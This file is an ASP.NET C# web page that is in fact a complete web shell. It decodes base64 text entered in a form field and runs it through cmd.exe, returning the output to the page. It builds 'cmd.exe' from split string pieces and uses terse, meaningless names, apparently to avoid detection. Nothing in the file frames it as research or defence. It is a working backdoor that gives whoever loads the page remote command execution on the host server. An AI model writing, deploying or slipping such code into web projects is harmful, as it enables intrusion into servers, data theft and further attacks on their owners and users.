<%@ Page Language="C#" %>
<%@ Import namespace="System.Diagnostics"%>
<%@ Import Namespace="System.IO" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
    }
    public string bd(string data)
    {
        try
        {
            System.Text.UTF8Encoding encoder = new System.Text.UTF8Encoding();
            System.Text.Decoder utf8Decode = encoder.GetDecoder();

            byte[] todecode_byte = Convert.FromBase64String(data);
            int charCount = utf8Decode.GetCharCount(todecode_byte, 0, todecode_byte.Length);
            char[] decoded_char = new char[charCount];
            utf8Decode.GetChars(todecode_byte, 0, todecode_byte.Length, decoded_char, 0);
            string result = new String(decoded_char);
            return result;
        }
        catch (Exception e)
        {
            throw new Exception("Error in base64Decode" + e.Message);
        }
    }
    protected void BE_Click(object sender, EventArgs e)
    {	

        Response.Write("<pre>");
        Response.Write(Server.HtmlEncode(this.ECD(TC.Text)));
        Response.Write("</pre>");
    }
    private string ECD(string cmm)
    {
        try
        {
            ProcessStartInfo PSI = new ProcessStartInfo();
            PSI.FileName = "c"+"m"+"d"+"."+"e"+"x"+""+""+""+"e";
            PSI.Arguments = "/c " + bd(cmm);
            PSI.RedirectStandardOutput = true;
            PSI.UseShellExecute = false;

            Process pro = Process.Start(PSI);
            using (StreamReader streamReader = pro.StandardOutput)
            {
                string ret = streamReader.ReadToEnd();

                return ret;
            }
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }
</script>

<html>
<head id="Head1" runat="server">
</head>
<body>
    <form id="formCommand" runat="server">
    <div>
        <table>
            <tr>
                <td><asp:TextBox ID="TC" runat="server" Width="820px"></asp:TextBox></td>
            </tr>
                <td>&nbsp;</td>
                <td><asp:Button ID="BE" runat="server" OnClick="BE_Click" Text="EC" /></td>
            </tr>
        </table>
    </div>
    </form>
</body>
</html>
